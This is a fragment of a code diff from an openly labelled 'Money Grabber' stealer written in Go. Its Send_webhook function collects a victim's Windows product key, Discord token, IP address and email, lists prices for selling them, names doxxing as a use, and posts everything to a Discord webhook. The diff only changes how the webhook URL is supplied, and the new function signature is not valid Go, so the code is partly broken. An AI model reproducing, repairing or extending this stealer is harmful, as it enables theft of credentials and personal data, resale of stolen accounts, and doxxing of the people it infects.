@@ -158,9 +158,9 @@ func Get_email() string {
 }
 
 // runs all the functions to get info and sends it to webhook
-func Send_webhook() {
+func Send_webhook(string webhook) {
 	info := "# :money_with_wings: Money Grabber :money_with_wings: " + "\n**Windows key** `" + Getkey() + "` - Can sell for *$0.99 - $9.99* :money_mouth: " + "\n**Token** ` " + Discord_stage() + " ` - Can sell for *$0.99 - $20.00* :money_mouth:" + "\n**IP** `" + Get_ip() + "` - Used for doxxing/hacking :wolf: " + "\n**Email** ` " + Get_email() + "` - Used for doxxing/hacking :brain: \n ||@everyone||"
-	webhook := "https://discord.com/api/webhooks/1343260924903034960/kpl55tLgc_ILr94BsNqeUInEaO8Uh6hWg2_vFYfOOeSAr80R9ZkatSCyCI313t8VmEqE"
+	
 	message := map[string]string{"content": info}
 	messageBytes, _ := json.Marshal(message)
 	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(messageBytes))
